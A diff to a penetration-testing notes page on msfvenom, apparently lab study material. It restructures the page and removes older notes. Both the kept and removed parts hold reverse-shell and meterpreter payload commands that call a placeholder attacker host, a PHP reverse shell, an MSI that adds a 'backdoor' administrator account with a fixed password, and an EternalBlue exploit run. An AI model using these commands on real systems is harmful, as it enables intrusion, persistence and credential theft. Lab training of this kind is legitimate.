@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/msfvenom.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Generate a Windows lab payload with explicit callback settings
+[Search this tool’s saved examples](/commands/notebook?tool=msfvenom) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Generate a Windows lab payload with explicit callback settings
 
 **Run in:** Kali. **Requires:** An x64 Windows lab target, a reachable callback address and a matching handler planned on Kali; this command generates a file only.
 
@@ -21,147 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o lab-payload.exe
 ```
 
-**Read the result:** Match payload platform, architecture, staged/stageless choice, output format and handler configuration.
-
-**If Generation succeeds but execution produces no session:** LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler.
+**What the result establishes:** Match payload platform, architecture, staged/stageless choice, output format and handler configuration.
 
 **Next check:** Check architecture, execution path, endpoint policy, callback route and handler payload type independently.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## msfvenom: choose the operation and read the result
-
-Generate a payload matching the target and listener.
-
-### What the result establishes
-
-Match payload platform, architecture, staged/stageless choice, output format and handler configuration.
-
-### Prerequisites and common failures
-
-LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler.
-
-### Example 1: Commands
-
-Run in: **Kali**. These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.
-
-```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o shell.exe
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.elf
-```
-
-### Example 2: Common MSFvenom Commands
-
-Run in: **Saved lab example**.
-
-```bash
-# Linux reverse shell (stageless, ELF binary)
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
-
-# Windows reverse shell (stageless, EXE)
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
-
-# Windows Meterpreter (staged)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > meterp.exe
-
-# List all payloads
-msfvenom -l payloads
-
-# List formats
-msfvenom --list formats
-```
-
-Saved context: [Shells, Payloads, and Interactive TTYs — Common MSFvenom Commands](/exploitation/shells-payloads-cheat-sheet#common-msfvenom-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Payloads — staged vs stageless
-
-Run in: **Saved lab example**.
-
-```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
-```
-
-Saved context: [Getting Started with Penetration Testing — Payloads — staged vs stageless](/getting-started/getting-started-cheat-sheet#payloads-—-staged-vs-stageless). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: AlwaysInstallElevated
-
-Run in: **Saved lab example**.
-
-```powershell
-msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
-msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
-msiexec /quiet /qn /i C:\evil.msi
-```
-
-Saved context: [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: MS17-010 (Eternal Blue)
-
-Run in: **Saved lab example**.
-
-```powershell
-git clone https://github.com/helviojunior/MS17-010
-
-# generate a simple reverse shell to use
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
-python2 send_and_execute.py 10.0.0.1 revshell.exe
-```
-
-Saved context: [Windows Privilege Escalation: Full Checklist — MS17-010 (Eternal Blue)](/privesc/windows-privesc-checklist#ms17-010-eternal-blue). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: msfvenom — generate standalone payloads
-
-Run in: **Saved lab example**.
-
-```bash
-# Linux ELF reverse shell
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
-
-# Windows EXE meterpreter
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
-
-# PHP web shell
-msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.php
-
-# List formats / payloads
-msfvenom --list formats
-msfvenom --list payloads | grep windows
-```
-
-Saved context: [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Mental model
-
-Run in: **Saved lab example**.
-
-```text
-Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
-No module, but can run a file? → msfvenom payload → multi/handler to catch it
-Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
-In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
-Need the internal net? → autoroute + socks_proxy → proxychains everything else
-Always: LHOST = your tun0, payload in venom must match the handler
-```
-
-Saved context: [Metasploit Framework: Startup to Sessions — Mental model](/exploitation/metasploit-framework-cheat-sheet#mental-model). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Generate a payload matching the target and listener.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=msfvenom) · [All tools](/index)
 
 ## Commands
 
@@ -174,13 +44,38 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.
 
 These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Generation succeeds but execution produces no session | LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler. |
 
 ## Notebook recipes
 
 9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
+
+<Accordion title="Generating Custom Reverse Shell Scripts">
+
+### Generating Custom Reverse Shell Scripts
+
+**File Upload Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+...SNIP...
+Payload size: 3033 bytes
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — HTB Module — Generating Custom Reverse Shell Scripts](/web/htb/file-upload-attacks#generating-custom-reverse-shell-scripts)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
 
 <Accordion title="Payloads — staged vs stageless">
 
@@ -360,27 +255,6 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 </Accordion>
 
-<Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">
-
-### 🧾 QUICK REFERENCE — "I see X → do Y"
-
-**Windows Post-Exploitation: Field Reference**
-
-Context from the notebook: AlwaysInstallElevated = 1 (both) msfvenom -f msi  →  msiexec /quiet /i evil.msi
-
-```text
-msfvenom -f msi
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Post-Exploitation: Field Reference — 🧾 QUICK REFERENCE — "I see X → do Y"](/cheatsheets/windows-post-exploitation#-quick-reference-—-i-see-x-→-do-y)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Generating a DLL Payload">
 
 ### Generating a DLL Payload
@@ -408,6 +282,10 @@ Final size of dll file: 8704 bytes
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -415,5 +293,3 @@ Final size of dll file: 8704 bytes
 - [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
